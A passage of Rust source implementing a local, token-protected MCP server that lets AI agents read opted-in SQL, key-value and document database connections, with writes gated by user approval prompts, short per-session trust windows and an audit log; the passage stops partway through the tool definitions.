//! Local MCP server: agents reach opted-in connections through the same
//! command layer as the UI; secrets never leave the core.

use std::collections::HashMap;
use std::io::Write as _;
use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

use rmcp::handler::server::wrapper::Parameters;
use rmcp::model::{CallToolResult, ContentBlock, ServerCapabilities, ServerInfo};
use rmcp::transport::streamable_http_server::session::local::LocalSessionManager;
use rmcp::transport::streamable_http_server::tower::{
  StreamableHttpServerConfig, StreamableHttpService,
};
use rmcp::{tool, tool_handler, tool_router, ErrorData as McpError, ServerHandler};
use serde::Serialize;
use specta::Type;
use tokio_util::sync::CancellationToken;

use crate::connectors::TableRowsRequest;
use crate::error::Error;
use crate::profiles::{AgentAccess, ConnectionProfile, ConnectorKind};
use crate::secrets::SecretKey;
use crate::{AppState, ApprovalAnswer, McpRunning, TrustWindow};

// Debug builds get their own port and agent-facing name, like the data dir
// and keychain scope: dev and an installed release can run side by side.
pub const DEFAULT_PORT: u16 = if cfg!(debug_assertions) { 52701 } else { 52700 };
/// Below this, binding needs root on unix.
pub const MIN_PORT: u16 = 1024;
/// A write nobody answers is a write nobody wanted.
const APPROVAL_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(60);
/// How long "allow for a while" lasts. Short on purpose: long enough for one
/// batch of writes, too short to forget it is open.
const TRUST_WINDOW: std::time::Duration = std::time::Duration::from_secs(15 * 60);
const SERVER_NAME: &str = if cfg!(debug_assertions) {
  "soquel-dev"
} else {
  "soquel"
};
/// Agents get capped result sets; the UI streams, agents paginate.
const MAX_AGENT_ROWS: usize = 500;

/// The toggle survives restarts: an enabled server comes back on launch.
#[derive(Debug, Clone, Copy, Serialize, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct McpSettings {
  enabled: bool,
  port: u16,
}

impl Default for McpSettings {
  fn default() -> Self {
    Self {
      enabled: false,
      port: DEFAULT_PORT,
    }
  }
}

fn load_settings(state: &AppState) -> McpSettings {
  std::fs::read_to_string(state.data_dir.join("mcp.json"))
    .ok()
    .and_then(|raw| serde_json::from_str(&raw).ok())
    .unwrap_or_default()
}

fn save_settings(state: &AppState, settings: McpSettings) {
  let path = state.data_dir.join("mcp.json");
  let written = serde_json::to_string_pretty(&settings)
    .map_err(std::io::Error::other)
    .and_then(|raw| std::fs::write(&path, raw));
  if let Err(err) = written {
    log::warn!("mcp settings write failed: {err}");
  }
}

fn check_port(port: u16) -> Result<(), Error> {
  if port < MIN_PORT {
    return Err(Error::Unsupported {
      message: format!("MCP port must be between {MIN_PORT} and 65535"),
    });
  }
  Ok(())
}

/// std bind: reports "port in use" synchronously and defers reactor
/// registration to the runtime that actually serves.
fn bind(port: u16) -> Result<std::net::TcpListener, Error> {
  check_port(port)?;
  std::net::TcpListener::bind(("127.0.0.1", port)).map_err(|err| match err.kind() {
    std::io::ErrorKind::AddrInUse => Error::Unsupported {
      message: format!("Port {port} is already in use. Pick another one."),
    },
    _ => Error::from(err),
  })
}

pub fn configured_port(state: &AppState) -> u16 {
  load_settings(state).port
}

/// Only while stopped: the port a running server bound is not up for edit.
pub async fn set_port(state: &AppState, port: u16) -> Result<(), Error> {
  check_port(port)?;
  if state.mcp.lock().await.is_some() {
    return Err(Error::Unsupported {
      message: "stop the MCP server before changing its port".to_string(),
    });
  }
  save_settings(
    state,
    McpSettings {
      port,
      ..load_settings(state)
    },
  );
  Ok(())
}

pub async fn autostart(
  state: std::sync::Arc<AppState>,
  make_approver: std::sync::Arc<dyn Fn() -> std::sync::Arc<dyn Approver> + Send + Sync>,
) {
  let settings = load_settings(&state);
  if settings.enabled {
    if let Err(err) = start(state, settings.port, make_approver).await {
      log::error!("mcp autostart failed: {err}");
    }
  }
}

#[derive(Debug, Clone, Serialize, serde::Deserialize, Type)]
#[serde(rename_all = "camelCase")]
pub struct AuditEntry {
  /// Milliseconds since the epoch; f64 because specta forbids u64 in bindings.
  pub ts: f64,
  pub tool: String,
  /// How a write got its yes; None on reads, which never ask.
  #[serde(default)]
  pub approval: Option<Approval>,
  pub connection: Option<String>,
  pub detail: Option<String>,
  pub ok: bool,
  pub error: Option<String>,
  pub duration_ms: f64,
}

/// The MCP call stays blocked until this is answered.
#[derive(Debug, Clone, Serialize, serde::Deserialize, Type)]
#[serde(rename_all = "camelCase")]
pub struct McpApprovalRequest {
  pub id: String,
  pub connection_id: String,
  pub connection_name: String,
  /// What runs, read as one line: the SQL, or "DEL session:42".
  pub operation: String,
  /// The body worth reading before allowing: the new value, the document.
  pub payload: Option<String>,
}

#[derive(Debug, Clone, Serialize, Type)]
#[serde(rename_all = "camelCase")]
pub struct McpStatus {
  pub running: bool,
  pub port: u16,
  pub endpoint: String,
  pub token: String,
  pub server_name: String,
}

fn new_token() -> String {
  format!(
    "{}{}",
    uuid::Uuid::new_v4().simple(),
    uuid::Uuid::new_v4().simple()
  )
}

pub fn ensure_token(secrets: &dyn crate::secrets::SecretStore) -> Result<String, Error> {
  if let Some(token) = secrets.get(&SecretKey::McpToken)? {
    return Ok(token);
  }
  let token = new_token();
  secrets.set(&SecretKey::McpToken, &token)?;
  Ok(token)
}

/// Only while stopped: the running middleware holds a snapshot of the token.
pub async fn regenerate_token(state: &AppState) -> Result<String, Error> {
  if state.mcp.lock().await.is_some() {
    return Err(Error::Unsupported {
      message: "stop the MCP server before regenerating its token".to_string(),
    });
  }
  let token = new_token();
  state.secrets.set(&SecretKey::McpToken, &token)?;
  Ok(token)
}

pub async fn status(state: &AppState) -> Result<McpStatus, Error> {
  let running = state.mcp.lock().await;
  let port = running
    .as_ref()
    .map_or_else(|| load_settings(state).port, |r| r.port);
  Ok(McpStatus {
    running: running.is_some(),
    port,
    endpoint: format!("http://127.0.0.1:{port}/mcp"),
    token: ensure_token(state.secrets.as_ref())?,
    server_name: SERVER_NAME.to_string(),
  })
}

pub async fn start(
  state: std::sync::Arc<AppState>,
  port: u16,
  make_approver: std::sync::Arc<dyn Fn() -> std::sync::Arc<dyn Approver> + Send + Sync>,
) -> Result<(), Error> {
  if state.mcp.lock().await.is_some() {
    return Err(Error::Unsupported {
      message: "MCP server already running".to_string(),
    });
  }
  let token = ensure_token(state.secrets.as_ref())?;
  let listener = bind(port)?;
  listener.set_nonblocking(true)?;
  let cancel = CancellationToken::new();

  let factory_state = state.clone();
  let service = StreamableHttpService::new(
    move || Ok(SoquelMcp::new(factory_state.clone(), make_approver.clone())),
    LocalSessionManager::default().into(),
    StreamableHttpServerConfig::default().with_cancellation_token(cancel.clone()),
  );
  let expected = Arc::new(format!("Bearer {token}"));
  let router = axum::Router::new()
    .nest_service("/mcp", service)
    .layer(axum::middleware::from_fn(
      move |req: axum::extract::Request, next: axum::middleware::Next| {
        let expected = expected.clone();
        async move { require_bearer(expected, req, next).await }
      },
    ));

  let serve_cancel = cancel.clone();
  tokio::spawn(async move {
    let served = async {
      let listener = tokio::net::TcpListener::from_std(listener)?;
      axum::serve(listener, router)
        .with_graceful_shutdown(async move { serve_cancel.cancelled().await })
        .await
    }
    .await;
    if let Err(err) = served {
      log::error!("mcp server stopped: {err}");
    }
  });
  *state.mcp.lock().await = Some(McpRunning { port, cancel });
  save_settings(
    &state,
    McpSettings {
      enabled: true,
      port,
    },
  );
  Ok(())
}

pub async fn stop(state: &AppState) -> Result<(), Error> {
  if let Some(running) = state.mcp.lock().await.take() {
    running.cancel.cancel();
  }
  // The sessions those windows were scoped to are gone with the server.
  state.trust_windows.lock().await.clear();
  save_settings(
    state,
    McpSettings {
      enabled: false,
      ..load_settings(state)
    },
  );
  Ok(())
}

async fn require_bearer(
  expected: Arc<String>,
  req: axum::extract::Request,
  next: axum::middleware::Next,
) -> axum::response::Response {
  use axum::response::IntoResponse;
  let authorized = req
    .headers()
    .get(axum::http::header::AUTHORIZATION)
    .and_then(|value| value.to_str().ok())
    .is_some_and(|value| value == expected.as_str());
  if authorized {
    next.run(req).await
  } else {
    axum::http::StatusCode::UNAUTHORIZED.into_response()
  }
}

/// One instance per MCP session: rmcp builds it once at initialize and hands
/// it to the session worker, so `session` identifies the agent for its lifetime.
#[derive(Clone)]
pub struct SoquelMcp {
  state: std::sync::Arc<AppState>,
  make_approver: std::sync::Arc<dyn Fn() -> std::sync::Arc<dyn Approver> + Send + Sync>,
  session: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct ConnectionArgs {
  /// Connection id from list_connections.
  connection_id: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct QueryArgs {
  /// Connection id from list_connections.
  connection_id: String,
  /// One SQL statement; executed with engine-enforced read-only semantics.
  sql: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct TableArgs {
  /// Connection id from list_connections.
  connection_id: String,
  schema: String,
  table: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct SampleArgs {
  /// Connection id from list_connections.
  connection_id: String,
  schema: String,
  table: String,
  /// Rows to return (default 100, capped at 500).
  limit: Option<u32>,
  offset: Option<u32>,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct KeyScanArgs {
  /// Connection id from list_connections.
  connection_id: String,
  /// Glob pattern, default "*".
  pattern: Option<String>,
  /// Continuation cursor from a previous page.
  cursor: Option<String>,
  /// Keys per page (default 100, capped at 500).
  count: Option<u32>,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct KeyArgs {
  /// Connection id from list_connections.
  connection_id: String,
  key: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct KeySetArgs {
  /// Connection id from list_connections.
  connection_id: String,
  key: String,
  value: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct KeyTtlArgs {
  /// Connection id from list_connections.
  connection_id: String,
  key: String,
  /// Milliseconds until expiry; omit to clear the expiry and keep the key.
  ttl_ms: Option<f64>,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct DatabaseArgs {
  /// Connection id from list_connections.
  connection_id: String,
  database: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct CollectionArgs {
  /// Connection id from list_connections.
  connection_id: String,
  database: String,
  collection: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct DocFindArgs {
  /// Connection id from list_connections.
  connection_id: String,
  database: String,
  collection: String,
  /// Extended JSON filter object, e.g. {"status": "paid"}.
  filter: Option<String>,
  /// Extended JSON sort object, e.g. {"createdAt": -1}.
  sort: Option<String>,
  /// Documents per page (default 20, capped at 500).
  limit: Option<u32>,
  /// Continuation cursor from a previous page.
  cursor: Option<String>,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct DocCountArgs {
  /// Connection id from list_connections.
  connection_id: String,
  database: String,
  collection: String,
  /// Extended JSON filter; omit for the fast collection estimate.
  filter: Option<String>,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct DocIdArgs {
  /// Connection id from list_connections.
  connection_id: String,
  database: String,
  collection: String,
  /// The document's `id` exactly as find_documents returned it (extended JSON).
  id: String,
}

#[derive(serde::Deserialize, rmcp::schemars::JsonSchema)]
#[schemars(crate = "rmcp::schemars")]
struct DocReplaceArgs {
  /// Connection id from list_connections.
  connection_id: String,
  database: String,
  collection: String,
  /// The document's `id` exactly as find_documents returned it (extended JSON).
  id: String,
  /// The whole replacement document as extended JSON; it must keep the same _id.
  document: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct AgentConnection {
  id: String,
  name: String,
  kind: ConnectorKind,
  access: AgentAccess,
  connected: bool,
  server_version: Option<String>,
}

/// Opted-in profiles only: everything else does not exist for agents.
pub fn agent_visible(profiles: Vec<ConnectionProfile>) -> Vec<ConnectionProfile> {
  profiles
    .into_iter()
    .filter(|profile| profile.agent_access != AgentAccess::None)
    .collect()
}

/// Flags `truncated` so an agent knows it is looking at a partial result.
pub fn capped(mut result: crate::connectors::QueryResult) -> serde_json::Value {
  let mut truncated = false;
  for statement in &mut result.statements {
    if statement.rows.len() > MAX_AGENT_ROWS {
      statement.rows.truncate(MAX_AGENT_ROWS);
      truncated = true;
    }
  }
  serde_json::json!({ "truncated": truncated, "result": result })
}

fn respond(outcome: Result<serde_json::Value, Error>) -> Result<CallToolResult, McpError> {
  match outcome {
    Ok(value) => Ok(CallToolResult::success(vec![ContentBlock::text(
      value.to_string(),
    )])),
    Err(err) => Err(McpError::internal_error(
      err.to_string(),
      serde_json::to_value(&err).ok(),
    )),
  }
}

fn opted_in(state: &AppState, id: &str) -> Result<ConnectionProfile, Error> {
  let profile = state.profiles.lock().unwrap().get(id)?;
  if profile.agent_access == AgentAccess::None {
    // Indistinguishable from a missing connection on purpose.
    return Err(Error::NotFound {
      message: format!("connection {id} not found"),
    });
  }
  Ok(profile)
}

async fn ensure_connected(state: &AppState, id: &str) -> Result<(), Error> {
  if state.connections.lock().await.contains_key(id) {
    return Ok(());
  }
  crate::ops::connect(state, id.to_string()).await.map_err(
    // Nobody can answer a prompt, or vouch for a command, on this side.
    |err| match err {
      Error::SecretRequired { target_name, .. } => Error::Unsupported {
        message: format!(
          "{target_name} asks for its password at each connection: open it in soquel first, then retry"
        ),
      },
      Error::CommandApprovalRequired { target_name, .. } => Error::Unsupported {
        message: format!(
          "{target_name} gets its password from a command nobody approved yet: approve it in soquel first, then retry"
        ),
      },
      other => other,
    },
  )
}

fn audit(
  state: &AppState,
  tool: &str,
  approval: Option<Approval>,
  connection: Option<&str>,
  detail: Option<&str>,
  outcome: &Result<serde_json::Value, Error>,
  started: Instant,
) {
  let entry = AuditEntry {
    ts: SystemTime::now()
      .duration_since(UNIX_EPOCH)
      .map_or(0.0, |since| since.as_millis() as f64),
    tool: tool.to_string(),
    approval,
    connection: connection.map(str::to_string),
    detail: detail.map(str::to_string),
    ok: outcome.is_ok(),
    error: outcome.as_ref().err().map(|err| err.to_string()),
    duration_ms: started.elapsed().as_secs_f64() * 1000.0,
  };
  let path = state.data_dir.join("mcp-audit.jsonl");
  let written = serde_json::to_string(&entry)
    .map_err(std::io::Error::other)
    .and_then(|line| {
      std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .and_then(|mut file| writeln!(file, "{line}"))
    });
  if let Err(err) = written {
    log::warn!("mcp audit append failed: {err}");
  }
}

/// Newest first; unparseable lines are skipped rather than failing the read.
pub fn audit_log(state: &AppState, limit: usize) -> Result<Vec<AuditEntry>, Error> {
  let raw = match std::fs::read_to_string(state.data_dir.join("mcp-audit.jsonl")) {
    Ok(raw) => raw,
    Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(Vec::new()),
    Err(err) => return Err(err.into()),
  };
  let mut entries: Vec<AuditEntry> = raw
    .lines()
    .filter_map(|line| serde_json::from_str(line).ok())
    .collect();
  entries.reverse();
  entries.truncate(limit);
  Ok(entries)
}

/// Answer a pending write request; unknown ids are stale (timed out) requests.
pub async fn resolve_approval(
  state: &AppState,
  id: &str,
  answer: ApprovalAnswer,
) -> Result<(), Error> {
  let waiting = state.approvals.lock().await.remove(id);
  match waiting {
    Some(sender) => {
      let _ = sender.send(answer);
      Ok(())
    }
    None => Err(Error::NotFound {
      message: format!("approval request {id} is no longer pending"),
    }),
  }
}

/// How a write got its yes; recorded so the log cannot imply a dialog nobody saw.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, serde::Deserialize, Type)]
#[serde(rename_all = "kebab-case")]
pub enum Approval {
  Asked,
  Covered,
}

/// How a pending write gets an answer; the app asks the user, tests decide.
#[async_trait::async_trait]
pub trait Approver: Send + Sync {
  async fn request(&self, state: &AppState, request: McpApprovalRequest) -> ApprovalAnswer;
}

pub async fn register_approval(
  state: &AppState,
  id: &str,
) -> tokio::sync::oneshot::Receiver<ApprovalAnswer> {
  let (sender, receiver) = tokio::sync::oneshot::channel();
  state.approvals.lock().await.insert(id.to_string(), sender);
  receiver
}

/// Waits out the standard approval window for a caller-registered request.
pub async fn wait_for_approval(
  state: &AppState,
  id: &str,
  receiver: tokio::sync::oneshot::Receiver<ApprovalAnswer>,
) -> ApprovalAnswer {
  await_approval(state, id, receiver, APPROVAL_TIMEOUT).await
}

/// Anything other than an explicit yes refuses: timeout, closed dialog, no answer.
async fn await_approval(
  state: &AppState,
  id: &str,
  receiver: tokio::sync::oneshot::Receiver<ApprovalAnswer>,
  timeout: std::time::Duration,
) -> ApprovalAnswer {
  let answer = tokio::time::timeout(timeout, receiver).await;
  state.approvals.lock().await.remove(id);
  match answer {
    Ok(Ok(given)) => given,
    _ => ApprovalAnswer::Deny,
  }
}

/// One row of the panel's "currently covered" list.
#[derive(Debug, Clone, Serialize, Type)]
#[serde(rename_all = "camelCase")]
pub struct TrustWindowInfo {
  pub session: String,
  pub connection_id: String,
  pub connection_name: String,
  pub expires_at_ms: f64,
}

pub async fn trust_windows(state: &AppState) -> Vec<TrustWindowInfo> {
  let mut windows = state.trust_windows.lock().await;
  let now = Instant::now();
  windows.retain(|_, window| window.expires > now);
  windows
    .iter()
    .map(|((session, connection_id), window)| TrustWindowInfo {
      session: session.clone(),
      connection_id: connection_id.clone(),
      connection_name: window.connection_name.clone(),
      expires_at_ms: window.expires_at_ms,
    })
    .collect()
}

pub async fn revoke_trust(state: &AppState, session: &str, connection_id: &str) {
  state
    .trust_windows
    .lock()
    .await
    .remove(&(session.to_string(), connection_id.to_string()));
}

async fn list_connections_impl(state: &AppState) -> Result<serde_json::Value, Error> {
  let profiles = agent_visible(state.profiles.lock().unwrap().list());
  let versions: HashMap<String, Option<String>> = {
    let connections = state.connections.lock().await;
    connections
      .iter()
      .map(|(id, active)| (id.clone(), active.connection.server_version()))
      .collect()
  };
  let list: Vec<AgentConnection> = profiles
    .into_iter()
    .map(|profile| AgentConnection {
      connected: versions.contains_key(&profile.id),
      server_version: versions.get(&profile.id).cloned().flatten(),
      kind: profile.params.kind(),
      access: profile.agent_access,
      id: profile.id,
      name: profile.name,
    })
    .collect();
  Ok(serde_json::to_value(list)?)
}

async fn get_schema_impl(
  state: &AppState,
  args: &ConnectionArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let introspect = connection.introspect().ok_or_else(|| Error::Unsupported {
    message: "this connection does not support schema introspection".to_string(),
  })?;
  Ok(serde_json::to_value(introspect.schema_snapshot().await?)?)
}

async fn get_table_ddl_impl(
  state: &AppState,
  args: &TableArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let introspect = connection.introspect().ok_or_else(|| Error::Unsupported {
    message: "this connection does not support schema introspection".to_string(),
  })?;
  let ddl = introspect.table_ddl(&args.schema, &args.table).await?;
  Ok(serde_json::Value::String(ddl))
}

async fn run_query_impl(
  state: &AppState,
  call: &mut AgentCall<'_>,
  args: &QueryArgs,
) -> Result<serde_json::Value, Error> {
  let profile = opted_in(state, &args.connection_id)?;
  let connection = agent_connection(state, &args.connection_id).await?;
  let sql = connection.sql().ok_or_else(|| Error::Unsupported {
    message: "this connection does not support SQL".to_string(),
  })?;
  // Reads always take the engine-enforced read-only path: classification only
  // decides whether to ask, never what the engine allows.
  if crate::connectors::is_read_statement(&args.sql) {
    return Ok(capped(sql.run_read_only_query(&args.sql).await?));
  }
  approve_write(state, call, &profile, args.sql.clone(), None).await?;
  Ok(capped(sql.run_query(&args.sql).await?))
}

/// One agent request. Carries who is asking, so a trust window is scoped to a
/// single MCP session, and reports back how the write got its yes.
pub struct AgentCall<'a> {
  session: &'a str,
  approver: &'a dyn Approver,
  approval: Option<Approval>,
}

impl<'a> AgentCall<'a> {
  pub fn new(session: &'a str, approver: &'a dyn Approver) -> Self {
    Self {
      session,
      approver,
      approval: None,
    }
  }
}

/// The only door to a write: opted in to writes, then either covered by a live
/// trust window or approved by the user.
async fn approve_write(
  state: &AppState,
  call: &mut AgentCall<'_>,
  profile: &ConnectionProfile,
  operation: String,
  payload: Option<String>,
) -> Result<(), Error> {
  // First, and before the window: a connection downgraded since the grant is
  // refused, so revoking access never has to hunt down open windows.
  if profile.agent_access != AgentAccess::WriteWithApproval {
    return Err(Error::Unsupported {
      message: "this connection is read-only for agents".to_string(),
    });
  }
  if window_covers(state, call.session, &profile.id).await {
    call.approval = Some(Approval::Covered);
    return Ok(());
  }
  call.approval = Some(Approval::Asked);
  let request = McpApprovalRequest {
    id: uuid::Uuid::new_v4().to_string(),
    connection_id: profile.id.clone(),
    connection_name: profile.name.clone(),
    operation,
    payload,
  };
  match call.approver.request(state, request).await {
    ApprovalAnswer::Deny => Err(Error::Unsupported {
      message: "the write was not approved".to_string(),
    }),
    ApprovalAnswer::Once => Ok(()),
    ApprovalAnswer::ForWindow => {
      open_window(state, call.session, profile).await;
      Ok(())
    }
  }
}

async fn window_covers(state: &AppState, session: &str, connection_id: &str) -> bool {
  let mut windows = state.trust_windows.lock().await;
  let key = (session.to_string(), connection_id.to_string());
  match windows.get(&key) {
    Some(window) if window.expires > Instant::now() => true,
    Some(_) => {
      windows.remove(&key);
      false
    }
    None => false,
  }
}

async fn open_window(state: &AppState, session: &str, profile: &ConnectionProfile) {
  let expires_at_ms = SystemTime::now()
    .checked_add(TRUST_WINDOW)
    .and_then(|at| at.duration_since(UNIX_EPOCH).ok())
    .map_or(0.0, |since| since.as_millis() as f64);
  state.trust_windows.lock().await.insert(
    (session.to_string(), profile.id.clone()),
    TrustWindow {
      expires: Instant::now() + TRUST_WINDOW,
      expires_at_ms,
      connection_name: profile.name.clone(),
    },
  );
}

async fn sample_rows_impl(state: &AppState, args: &SampleArgs) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let sql = connection.sql().ok_or_else(|| Error::Unsupported {
    message: "this connection does not support table browsing".to_string(),
  })?;
  let request = TableRowsRequest {
    schema: args.schema.clone(),
    table: args.table.clone(),
    limit: Some(args.limit.unwrap_or(100).min(MAX_AGENT_ROWS as u32)),
    offset: args.offset.unwrap_or(0),
    sort: None,
    filters: Vec::new(),
    include_ctid: false,
    include_xmin: false,
  };
  Ok(capped(sql.table_rows(&request).await?))
}

async fn agent_connection(
  state: &AppState,
  id: &str,
) -> Result<Arc<dyn crate::connectors::Connection>, Error> {
  opted_in(state, id)?;
  ensure_connected(state, id).await?;
  crate::ops::active(state, id).await
}

async fn list_keys_impl(state: &AppState, args: &KeyScanArgs) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let page = kv_surface(&connection)?
    .scan_keys(
      args.pattern.as_deref().unwrap_or("*"),
      args.cursor.as_deref(),
      args.count.unwrap_or(100).min(MAX_AGENT_ROWS as u32),
    )
    .await?;
  Ok(serde_json::to_value(page)?)
}

async fn get_key_impl(state: &AppState, args: &KeyArgs) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let kv = kv_surface(&connection)?;
  Ok(serde_json::to_value(kv.key_detail(&args.key).await?)?)
}

async fn set_key_impl(
  state: &AppState,
  call: &mut AgentCall<'_>,
  args: &KeySetArgs,
) -> Result<serde_json::Value, Error> {
  let profile = opted_in(state, &args.connection_id)?;
  let connection = agent_connection(state, &args.connection_id).await?;
  let kv = kv_surface(&connection)?;
  let operation = format!("SET {}", args.key);
  approve_write(state, call, &profile, operation, Some(args.value.clone())).await?;
  kv.set_string(&args.key, &args.value).await?;
  Ok(serde_json::Value::Null)
}

async fn delete_key_impl(
  state: &AppState,
  call: &mut AgentCall<'_>,
  args: &KeyArgs,
) -> Result<serde_json::Value, Error> {
  let profile = opted_in(state, &args.connection_id)?;
  let connection = agent_connection(state, &args.connection_id).await?;
  let kv = kv_surface(&connection)?;
  approve_write(state, call, &profile, format!("DEL {}", args.key), None).await?;
  kv.delete_key(&args.key).await?;
  Ok(serde_json::Value::Null)
}

async fn set_ttl_impl(
  state: &AppState,
  call: &mut AgentCall<'_>,
  args: &KeyTtlArgs,
) -> Result<serde_json::Value, Error> {
  let profile = opted_in(state, &args.connection_id)?;
  let connection = agent_connection(state, &args.connection_id).await?;
  let kv = kv_surface(&connection)?;
  let operation = match args.ttl_ms {
    Some(ttl) => format!("PEXPIRE {} {ttl}", args.key),
    None => format!("PERSIST {}", args.key),
  };
  approve_write(state, call, &profile, operation, None).await?;
  kv.set_ttl(&args.key, args.ttl_ms).await?;
  Ok(serde_json::Value::Null)
}

fn kv_surface(
  connection: &Arc<dyn crate::connectors::Connection>,
) -> Result<&dyn crate::connectors::KvBrowse, Error> {
  connection.kv().ok_or_else(|| Error::Unsupported {
    message: "this connection is not a key-value store".to_string(),
  })
}

/// Redis reports a count, mongo a named list: one tool for either engine.
async fn list_databases_impl(
  state: &AppState,
  args: &ConnectionArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  if let Some(doc) = connection.doc() {
    return Ok(serde_json::to_value(doc.databases().await?)?);
  }
  if let Some(kv) = connection.kv() {
    return Ok(serde_json::to_value(kv.databases().await?)?);
  }
  Err(Error::Unsupported {
    message: "this connection has no databases to list; use get_schema".to_string(),
  })
}

async fn list_collections_impl(
  state: &AppState,
  args: &DatabaseArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let doc = doc_surface(&connection)?;
  Ok(serde_json::to_value(
    doc.collections(&args.database).await?,
  )?)
}

async fn find_documents_impl(
  state: &AppState,
  args: &DocFindArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let doc = doc_surface(&connection)?;
  let request = crate::connectors::DocFindRequest {
    db: args.database.clone(),
    collection: args.collection.clone(),
    filter: args.filter.clone(),
    sort: args.sort.clone(),
    limit: args.limit.unwrap_or(20).min(MAX_AGENT_ROWS as u32),
    cursor: args.cursor.clone(),
  };
  Ok(serde_json::to_value(doc.find_docs(&request).await?)?)
}

async fn count_documents_impl(
  state: &AppState,
  args: &DocCountArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let doc = doc_surface(&connection)?;
  let count = doc
    .count_docs(&args.database, &args.collection, args.filter.as_deref())
    .await?;
  Ok(serde_json::to_value(count)?)
}

async fn list_indexes_impl(
  state: &AppState,
  args: &CollectionArgs,
) -> Result<serde_json::Value, Error> {
  let connection = agent_connection(state, &args.connection_id).await?;
  let doc = doc_surface(&connection)?;
  Ok(serde_json::to_value(
    doc.indexes(&args.database, &args.collection).await?,
  )?)
}

async fn replace_document_impl(
  state: &AppState,
  call: &mut AgentCall<'_>,
  args: &DocReplaceArgs,
) -> Result<serde_json::Value, Error> {
  let profile = opted_in(state, &args.connection_id)?;
  let connection = agent_connection(state, &args.connection_id).await?;
  let doc = doc_surface(&connection)?;
  let operation = format!("replace {}.{} {}", args.database, args.collection, args.id);
  approve_write(
    state,
    call,
    &profile,
    operation,
    Some(args.document.clone()),
  )
  .await?;
  doc
    .replace_doc(&args.database, &args.collection, &args.id, &args.document)
    .await?;
  Ok(serde_json::Value::Null)
}

async fn delete_document_impl(
  state: &AppState,
  call: &mut AgentCall<'_>,
  args: &DocIdArgs,
) -> Result<serde_json::Value, Error> {
  let profile = opted_in(state, &args.connection_id)?;
  let connection = agent_connection(state, &args.connection_id).await?;
  let doc = doc_surface(&connection)?;
  let operation = format!("delete {}.{} {}", args.database, args.collection, args.id);
  approve_write(state, call, &profile, operation, None).await?;
  doc
    .delete_doc(&args.database, &args.collection, &args.id)
    .await?;
  Ok(serde_json::Value::Null)
}

fn doc_surface(
  connection: &Arc<dyn crate::connectors::Connection>,
) -> Result<&dyn crate::connectors::DocBrowse, Error> {
  connection.doc().ok_or_else(|| Error::Unsupported {
    message: "this connection is not a document store".to_string(),
  })
}

#[tool_router]
impl SoquelMcp {
  pub fn new(
    state: std::sync::Arc<AppState>,
    make_approver: std::sync::Arc<dyn Fn() -> std::sync::Arc<dyn Approver> + Send + Sync>,
  ) -> Self {
    Self {
      state,
      make_approver,
      session: uuid::Uuid::new_v4().to_string(),
    }
  }

  fn state(&self) -> &AppState {
    &self.state
  }

  #[tool(
    description = "List the database connections exposed to agents (opt-in per connection in the Soquel UI). Returns id, kind, access level and connected state."
  )]
  async fn list_connections(&self) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = list_connections_impl(state).await;
    audit(
      state,
      "list_connections",
      None,
      None,
      None,
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Schema snapshot of a connection: schemas, tables, columns, primary keys, foreign keys and indexes."
  )]
  async fn get_schema(
    &self,
    Parameters(args): Parameters<ConnectionArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = get_schema_impl(state, &args).await;
    audit(
      state,
      "get_schema",
      None,
      Some(&args.connection_id),
      None,
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(description = "DDL of one table (CREATE TABLE and related statements).")]
  async fn get_table_ddl(
    &self,
    Parameters(args): Parameters<TableArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = get_table_ddl_impl(state, &args).await;
    audit(
      state,
      "get_table_ddl",
      None,
      Some(&args.connection_id),
